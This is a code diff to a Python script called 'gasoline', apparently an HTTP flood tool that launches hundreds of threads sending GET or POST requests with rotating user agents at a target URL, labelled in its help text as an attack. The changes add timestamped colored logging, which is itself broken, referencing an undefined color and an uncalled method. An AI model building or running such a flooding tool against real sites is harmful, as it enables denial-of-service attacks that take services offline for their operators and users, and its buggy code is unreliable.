@@ -1,5 +1,5 @@
 import requests
-import threading,argparse,sys,random
+import threading,argparse,sys,random,time
 from colorama import Fore
 from random import choice
 
@@ -23,6 +23,12 @@ banner='''
 					gasoline version 1.0
 					writen by jijue
 '''
+
+red=Fore.RED
+green=Fore.GREEN
+white=Fore.WHITE
+reset=Fore.RESET
+
 useragents=['Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 YaBrowser/1.7.1364.22194 Safari/537.22',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/28.0.1500.71 Chrome/28.0.1500.71 Safari/537.36',
@@ -133,6 +139,18 @@ useragents=['Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36',
     'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36',]
+
+def get_time():
+	return '[' + time.strftime('%H:%M:%S',time.localtime()) + ']'
+	
+def print_highlight(message):
+	time=get_time()
+	level={'ERROR':red,'INFO':white,'HINT':yellow}
+	for lev,color in level.items:
+		if lev in message:
+			print(color+time+message+reset)
+
+
 def get():
 	global total,url
 	headers={	'User-Agent':choice(useragents),
@@ -169,7 +187,7 @@ def post():
 		sys.stdout.write('URL:%s | Total:%i | Status_code:%i\n' % (url,total,status))
 		sys.stdout.flush()
 
-def main(arg):
+def main():
 	parser=argparse.ArgumentParser('gasoline.py -u <url> -t <thread(default:500)>\n\tWritten by jijue.')
 	parser.add_argument('-g','--get',help='url for attack use get method.')
 	parser.add_argument('-p','--post',help='url for attack use post method.')
@@ -182,25 +200,25 @@ def main(arg):
 	data=args.data
 	
 	if args.get:
-		print(Fore.BLUE+banner+Fore.RESET)
+		print_highlight(banner)
 		url=args.get
-		print('current number of threads is %i\n'%thread)
+		print_highlight('[INFO] current number of threads is %i\n'%thread)
 		for i in range(int(thread)):
 			gasoline=threading.Thread(target=get)
 			gasoline.start()
 	
 	if args.post and args.data:
-		print(Fore.RED+banner+Fore.RESET)
+		print_highlight(banner)
 		url=args.post
-		print('current number of threads is %i\n'%thread)
+		print_highlight('[INFO] current number of threads is %i\n'%thread)
 		for i in range(int(thread)):
 			gasoline=threading.Thread(target=post)
 			gasoline.start()
 	else:
-		print(Fore.RED+banner+Fore.RESET)
+		print_highlight('[INFO] '+banner)
 		parser.print_help()
 		sys.exit()
 
 if __name__=='__main__':
-	main(sys.argv[1:])
+	main()
 
